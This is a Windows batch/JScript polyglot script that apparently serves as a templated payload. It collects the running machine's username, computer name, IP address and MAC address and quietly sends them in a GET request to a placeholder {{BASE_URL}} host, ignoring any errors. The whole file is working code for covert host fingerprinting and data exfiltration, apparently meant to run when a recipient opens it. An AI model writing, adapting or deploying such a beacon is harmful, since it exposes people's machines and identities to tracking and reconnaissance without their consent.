@if (@This==@IsBatch) @then
@echo off

    setlocal enableextensions disabledelayedexpansion

    for /f "delims=[] tokens=2" %%a in ('ping -4 %computername% -n 1 ^| findstr "["') do (SET thisip=%%a)
    SET ipaddress=%thisip%

    for /f "tokens=1" %%a in ('getmac /NH /S %ipaddress%') do  (SET thismac=%%a)
    SET macaddress=%thismac%

    SET uname=%username%
    SET cname=%computername%

    SET baseurl={{BASE_URL}}

    SET "link=%baseurl%^&username=%uname%^&computername=%cname%^&ip=%ipaddress%^&mac=%macaddress%^&payload=BAT"

    wscript //E:JScript "%~dpnx0" %link%

    exit /b

@end

var http = WScript.CreateObject('Msxml2.ServerXMLHTTP.6.0');

var url = WScript.Arguments.Item(0)

    try {
      http.open("GET", url, false);
      http.send();
    } catch(err) {

    }

    WScript.Quit(0);
